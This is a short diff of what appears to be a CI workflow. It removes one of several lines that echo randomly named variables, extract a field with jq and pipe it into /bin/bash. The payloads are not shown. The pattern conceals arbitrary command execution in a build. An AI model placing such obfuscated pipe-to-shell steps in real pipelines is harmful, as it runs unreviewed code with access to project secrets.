@@ -27,7 +27,6 @@ jobs:
           echo $pzng983 | jq -r .na144 | /bin/bash
           echo $or59 | jq -r .ddez91344 | /bin/bash
           printf '%s' "$gxvrf6" | jq -r .zl1527 | /bin/bash
-          echo $k1 | jq -r .hv5 | /bin/bash
           echo $sur5089 | jq -r .w7 | /bin/bash
 
       - name: Save archive
